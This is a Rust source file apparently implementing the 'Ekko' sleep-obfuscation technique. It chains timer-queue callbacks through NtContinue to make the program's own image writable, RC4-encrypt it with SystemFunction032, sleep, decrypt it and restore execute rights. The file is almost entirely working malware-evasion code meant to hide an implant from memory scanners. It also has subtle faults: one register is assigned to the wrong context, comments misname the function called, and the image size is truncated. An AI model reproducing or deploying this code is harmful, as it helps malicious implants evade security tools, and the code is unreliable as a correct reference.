use std::{
    ffi::c_void,
    mem::{zeroed},
    ptr::{null_mut},
};
use ntapi::winapi::um::errhandlingapi::GetLastError;
use windows_sys::Win32::{
    Foundation::{HANDLE, UNICODE_STRING},
    System::{
        Diagnostics::Debug::{CONTEXT, IMAGE_NT_HEADERS64},
        LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
        Memory::{VirtualProtect, PAGE_EXECUTE_READ, PAGE_READWRITE},
        SystemServices::IMAGE_DOS_HEADER,
        Threading::{
            CreateEventW, CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueue, SetEvent,
            WaitForSingleObject, WT_EXECUTEINTIMERTHREAD,
        },
        WindowsProgramming::INFINITE,
    },
};

pub fn ekko(sleep_time: u32) {
    // Contains processor-specific register data. The system uses CONTEXT structures to perform various internal operations.
    // https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context
    let ctx_thread: CONTEXT = unsafe { zeroed::<CONTEXT>() };

    let mut h_new_timer: HANDLE = 0;
    let mut old_protect: u32 = 0;

    // This can be a randomly generated key
    let mut key_buf: [i8; 16] = [
        0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55,
        0x55,
    ];
    let mut key: UNICODE_STRING = unsafe { zeroed::<UNICODE_STRING>() };
    let mut img: UNICODE_STRING = unsafe { zeroed::<UNICODE_STRING>() };

    // Creates or opens a named or unnamed event object.
    // https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createeventw
    let h_event = unsafe { CreateEventW(null_mut(), 0, 0, null_mut()) };

    // Creates a queue for timers. Timer-queue timers are lightweight objects that enable you to specify a callback function to be called at a specified time.
    // https://learn.microsoft.com/en-us/windows/win32/api/threadpoollegacyapiset/nf-threadpoollegacyapiset-createtimerqueue
    let h_timer_queue = unsafe { CreateTimerQueue() };

    let nt_continue = unsafe {
        GetProcAddress(
            GetModuleHandleA("ntdll.dll\0".as_ptr()),
            "NtContinue\0".as_ptr(),
        )
    };
    let sys_func032 = unsafe {
        GetProcAddress(
            LoadLibraryA("cryptsp.dll\0".as_ptr()),
            "SystemFunction032\0".as_ptr(),
        )
    };
    let rtlcont = unsafe {
        GetProcAddress(
            GetModuleHandleA("ntdll.dll\0".as_ptr()),
            "RtlCaptureContext\0".as_ptr(),
        )
    };

    let image_base = unsafe { GetModuleHandleA(null_mut()) };
    let dos_header = image_base as *mut IMAGE_DOS_HEADER;
    let nt_headesr =
        unsafe { (dos_header as u64 + (*dos_header).e_lfanew as u64) as *mut IMAGE_NT_HEADERS64 };
    let image_size = unsafe { (*nt_headesr).OptionalHeader.SizeOfImage };

    log::info!("[+] Image Base: {:#x}", image_base as u64);
    log::info!("[+] Image Size: {:#x}", image_size as u64);
    log::info!("[+] NtContinue: {:#x}", nt_continue.unwrap() as u64);
    log::info!("[+] SystemFunction032: {:#x}", sys_func032.unwrap() as u64);
    log::info!("[+] RtlCaptureContext: {:#x}", rtlcont.unwrap() as u64);

    key.Buffer = key_buf.as_mut_ptr() as *mut u16;
    key.Length = key_buf.len() as u16; // 16
    key.MaximumLength = key_buf.len() as u16; // 16

    img.Buffer = image_base as *mut u16;
    img.Length = image_size as u16;
    img.MaximumLength = image_size as u16;

    log::info!("[+] Calling CreateTimerQueueTimer with ctx_thread");
    // Creates a timer-queue timer. This timer expires at the specified due time, then after every specified period. When the timer expires, the callback function is called.
    // https://learn.microsoft.com/en-us/windows/win32/api/threadpoollegacyapiset/nf-threadpoollegacyapiset-createtimerqueuetimer
    let success = unsafe {
        CreateTimerQueueTimer(
            &mut h_new_timer,
            h_timer_queue,
            std::mem::transmute(rtlcont),
            &ctx_thread as *const _ as *const _,
            0,
            0,
            WT_EXECUTEINTIMERTHREAD,
        )
    };

    if success != 0 {
        unsafe {
            log::info!("[+] Calling WaitForSingleObject for 0x32 ms");
            // Waits until the specified object is in the signaled state or the time-out interval elapses.
            // https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
            WaitForSingleObject(h_event, 0x32);
        }

        log::info!("[+] Copying ctx_thread to rop chains");
        let mut rop_prot_rw = ctx_thread.clone();
        let mut rop_mem_enc = ctx_thread.clone();
        let mut rop_delay = ctx_thread.clone();
        let mut rop_mem_dec = ctx_thread.clone();
        let mut rop_prot_rx = ctx_thread.clone();
        let mut rop_set_evt = ctx_thread.clone();

        log::info!("[+] Building ROP chain");
        // pub unsafe extern "system" fn VirtualProtect(lpaddress: *const c_void, dwsize: usize, flnewprotect: PAGE_PROTECTION_FLAGS, lpfloldprotect: *mut PAGE_PROTECTION_FLAGS) -> BOOL
        // https://docs.rs/windows-sys/latest/windows_sys/Win32/System/Memory/fn.VirtualProtect.html
        rop_prot_rw.Rsp = -8 as isize as u64;
        rop_prot_rw.Rip = VirtualProtect as u64;
        rop_prot_rw.Rcx = image_base as u64;
        rop_prot_rw.Rdx = image_size as u64;
        rop_prot_rw.R8 = PAGE_READWRITE as u64;
        rop_prot_rw.R9 = &mut old_protect as *mut u32 as u64;

        // pub unsafe extern "system" fn SystemFunction036(randombuffer: *mut c_void, randombufferlength: u32) -> BOOLEAN
        // https://docs.rs/windows-sys/latest/windows_sys/Win32/Security/Authentication/Identity/fn.SystemFunction036.html
        rop_mem_enc.Rsp = -8 as isize as u64;
        rop_mem_enc.Rip = sys_func032.unwrap() as u64;
        rop_mem_enc.Rcx = &mut img as *mut UNICODE_STRING as *mut c_void as u64;
        rop_mem_enc.Rdx = key.Length as u64;

        // pub unsafe extern "system" fn WaitForSingleObject(hhandle: HANDLE, dwmilliseconds: u32) -> WIN32_ERROR
        // https://docs.rs/windows-sys/latest/windows_sys/Win32/System/Threading/fn.WaitForSingleObject.html
        rop_delay.Rsp = -8 as isize as u64;
        rop_delay.Rip = WaitForSingleObject as u64;
        rop_delay.Rcx = -1 as isize as u64; // NtCurrentProcess
        rop_delay.Rdx = sleep_time as u64;

        // pub unsafe extern "system" fn SystemFunction036(randombuffer: *mut c_void, randombufferlength: u32) -> BOOLEAN
        // https://docs.rs/windows-sys/latest/windows_sys/Win32/Security/Authentication/Identity/fn.SystemFunction036.html
        rop_mem_dec.Rsp = -8 as isize as u64;
        rop_mem_dec.Rip = sys_func032.unwrap() as u64;
        rop_mem_dec.Rcx = &mut img as *mut UNICODE_STRING as *mut c_void as u64;
        rop_mem_dec.Rdx = key.Length as u64;

        // pub unsafe extern "system" fn VirtualProtect(lpaddress: *const c_void, dwsize: usize, flnewprotect: PAGE_PROTECTION_FLAGS, lpfloldprotect: *mut PAGE_PROTECTION_FLAGS) -> BOOL
        // https://docs.rs/windows-sys/latest/windows_sys/Win32/System/Memory/fn.VirtualProtect.html
        rop_prot_rx.Rsp = -8 as isize as u64;
        rop_prot_rx.Rip = VirtualProtect as u64;
        rop_prot_rx.Rcx = image_base as u64;
        rop_prot_rx.Rdx = image_size as u64;
        rop_prot_rx.R8 = PAGE_EXECUTE_READ as u64;
        rop_prot_rw.R9 = &mut old_protect as *mut u32 as u64;

        // https://docs.rs/windows-sys/latest/windows_sys/Win32/System/Threading/fn.SetEvent.html
        // pub unsafe extern "system" fn SetEvent(hevent: HANDLE) -> BOOL
        rop_set_evt.Rsp = -8 as isize as u64;
        rop_set_evt.Rip = SetEvent as u64;
        rop_set_evt.Rcx = h_event as u64;

        log::info!("[+] Rop chain built");
        log::info!("[+] Queue timers");
        unsafe {
            let result = CreateTimerQueueTimer(
                &mut h_new_timer,
                h_timer_queue,
                std::mem::transmute(nt_continue),
                &rop_prot_rw as *const _ as *const _,
                100,
                0,
                WT_EXECUTEINTIMERTHREAD,
            );
            if result == 0 {
                panic!("[!] Failed calling CreateTimerQueueTimer with rop_prot_rw (VirtualProtect RW) {:#x}", GetLastError());
            }

            let result = CreateTimerQueueTimer(
                &mut h_new_timer,
                h_timer_queue,
                std::mem::transmute(nt_continue),
                &rop_mem_enc as *const _ as *const _,
                100,
                0,
                WT_EXECUTEINTIMERTHREAD,
            );
            if result == 0 {
                panic!("[!] Failed calling CreateTimerQueueTimer with rop_mem_enc (SystemFunction036) {:#x}", GetLastError());
            }

            let result = CreateTimerQueueTimer(
                &mut h_new_timer,
                h_timer_queue,
                std::mem::transmute(nt_continue),
                &rop_delay as *const _ as *const _,
                100,
                0,
                WT_EXECUTEINTIMERTHREAD,
            );
            if result == 0 {
                panic!("[!] Failed calling CreateTimerQueueTimer with rop_delay (WaitForSingleObject) {:#x}", GetLastError());
            }

            let result = CreateTimerQueueTimer(
                &mut h_new_timer,
                h_timer_queue,
                std::mem::transmute(nt_continue),
                &rop_mem_dec as *const _ as *const _,
                100,
                0,
                WT_EXECUTEINTIMERTHREAD,
            );
            if result == 0 {
                panic!("[!] Failed calling CreateTimerQueueTimer with rop_mem_dec (SystemFunction036) {:#x}", GetLastError());
            }

            let result = CreateTimerQueueTimer(
                &mut h_new_timer,
                h_timer_queue,
                std::mem::transmute(nt_continue),
                &rop_prot_rx as *const _ as *const _,
                100,
                0,
                WT_EXECUTEINTIMERTHREAD,
            );
            if result == 0 {
                panic!("[!] Failed calling CreateTimerQueueTimer with rop_prot_rx (VirtualProtect RX) {:#x}", GetLastError());
            }

            let result = CreateTimerQueueTimer(
                &mut h_new_timer,
                h_timer_queue,
                std::mem::transmute(nt_continue),
                &rop_set_evt as *const _ as *const _,
                100,
                0,
                WT_EXECUTEINTIMERTHREAD,
            );
            if result == 0 {
                panic!("[!] Failed calling CreateTimerQueueTimer with rop_set_evt (SetEvent) {:#x}", GetLastError());
            }
            
            log::info!("[+] Waiting for event...");

            WaitForSingleObject(h_event, INFINITE); //0xFFFFFFFF

            log::info!("[+] Finished waiting for event");
        }
    }

    // Deletes a timer queue. Any pending timers in the queue are canceled and deleted.
    // https://learn.microsoft.com/en-us/windows/win32/api/threadpoollegacyapiset/nf-threadpoollegacyapiset-deletetimerqueue
    unsafe {
        DeleteTimerQueue(h_timer_queue);
    }
}

#[allow(dead_code)]
/// Gets user input from the terminal
fn get_input() -> std::io::Result<()> {
    let mut buf = String::new();
    std::io::stdin().read_line(&mut buf)?;
    Ok(())
}

#[allow(dead_code)]
/// Used for debugging
pub fn pause() {
    match get_input() {
        Ok(buffer) => println!("{:?}", buffer),
        Err(error) => println!("error: {}", error),
    };
}
